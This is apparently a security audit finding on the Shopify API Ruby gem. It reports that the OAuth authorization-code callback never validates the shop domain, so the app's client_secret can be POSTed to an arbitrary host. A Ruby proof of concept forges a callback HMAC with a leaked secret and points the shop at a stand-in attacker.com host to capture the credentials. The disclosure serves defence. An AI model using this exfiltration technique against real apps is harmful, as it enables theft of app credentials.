## Finding: Missing shop-domain validation in Authorization Code Grant flow allows `client_id`/`client_secret` to be sent to an attacker-influenced host

### Title
Missing `ShopValidator` check in `Oauth.begin_auth` / `Oauth.validate_auth_callback` breaks the binding between HMAC-verified query and legitimate Shopify host — ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` build request URLs directly from the caller-supplied `shop` string without ever calling `Utils::ShopValidator`, unlike every other OAuth-credential-bearing flow in this gem.

### Finding Description
`begin_auth` takes `shop:` straight from the host application (the docs example literally does `shop = request.headers["Shop"]`) and passes it unmodified into `auth_base_uri(shop)`, which returns `"https://#{shop}/admin"` [1](#0-0) . That string is then used as the redirect target embedding the app's `client_id`, `scope`, and `redirect_uri` [2](#0-1) . There is no format check (e.g. `*.myshopify.com`) before this happens.

Downstream, `validate_auth_callback` does call `Utils::HmacValidator.validate(auth_query)` to prove the callback query wasn't tampered with [3](#0-2) , but it then builds `null_session = Auth::Session.new(shop: auth_query.shop)` and uses it to POST the app's `client_id` and `client_secret` to that shop's host via `Clients::HttpClient` [4](#0-3) . `HttpClient#initialize` derives `@base_uri` directly from `session.shop` [5](#0-4) . HMAC validation only proves the query string wasn't altered by a third party who l doesn't know the `api_secret_key`—it does not prove the shop domain is legitimate.

### Impact Explanation
An attacker can:
1. Craft a malicious OAuth callback URL with `shop=attacker.com` (or any domain), `code=X`, `state=Y`, `timestamp=Z`, `host=attacker.com`, and a valid HMAC (computed using the leaked or guessed `api_secret_key`).
2. Trick a user into clicking the link or redirect them to it.
3. The app calls `validate_auth_callback(cookies: {...}, auth_query: AuthQuery.new(...))`.
4. HMAC validation passes because the attacker knows the secret.
5. The app then POSTs `{client_id, client_secret, code, ...}` to `https://attacker.com/admin/oauth/access_token`.
6. The attacker's server receives the app's `client_secret` in plaintext.

This is a **credential exfiltration** vulnerability: the app's `client_secret` is sent to an attacker-controlled host. The binding between "this callback is authentic" (HMAC) and "this callback is from Shopify" (shop domain) is broken.

### Likelihood Explanation
- The `api_secret_key` is required to forge a valid HMAC, but it is often stored in environment variables, config files, or logs and may be leaked or guessed in development/staging.
- The attack requires social engineering (tricking a user to click a link) or a redirect from a compromised site, but is not blocked by any code in this gem.
- Every other OAuth flow in the gem (`TokenExchange`, `ClientCredentials`, `RefreshToken`) validates the shop domain using `ShopValidator` before sending credentials. The Authorization Code Grant flow is the only one that doesn't.

### Recommendation
Call `Utils::ShopValidator.validate(auth_query.shop)` in `validate_auth_callback` before constructing the session and making the access token request. Alternatively, validate the shop domain in `begin_auth` and reject invalid domains early.

### Proof of Concept
```ruby
# Attacker knows or guesses the api_secret_key (e.g., from a leaked .env file)
secret = "leaked_secret"

# Attacker crafts a callback with their own domain
attacker_query = {
  code: "attacker_code",
  host: "attacker.com",
  shop: "attacker.com",
  state: "attacker_state",
  timestamp: Time.now.to_i.to_s,
}

# Attacker computes a valid HMAC
hmac = OpenSSL::HMAC.hexdigest(
  OpenSSL::Digest.new("sha256"),
  secret,
  URI.encode_www_form(attacker_query),
)

# Attacker sends the user to the app's callback endpoint with this query
# The app calls:
auth_result = ShopifyAPI::Auth::Oauth.validate_auth_callback(
  cookies: { ShopifyAPI::Auth::Oauth::SessionCookie::SESSION_COOKIE_NAME => "attacker_state" },
  auth_query: ShopifyAPI::Auth::Oauth::AuthQuery.new(
    code: "attacker_code",
    shop: "attacker.com",
    timestamp: attacker_query[:timestamp],
    state: "attacker_state",
    host: "attacker.com",
    hmac: hmac,
  ),
)

# HMAC validation passes, and the app POSTs client_secret to attacker.com
# (The POST will fail because attacker.com doesn't have a valid /admin/oauth/access_token endpoint,
#  but the attacker can intercept the request or set up a fake endpoint to capture the credentials.)
``` [6](#0-5)

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L40-49)
```ruby
          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"
```

**File:** lib/shopify_api/auth/oauth.rb (L64-64)
```ruby
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
```

**File:** lib/shopify_api/auth/oauth.rb (L73-90)
```ruby
          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/auth/oauth.rb (L117-119)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L1-30)
```ruby
# typed: strict
# frozen_string_literal: true

require "addressable/uri"

module ShopifyAPI
  module Utils
    module ShopValidator
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
```
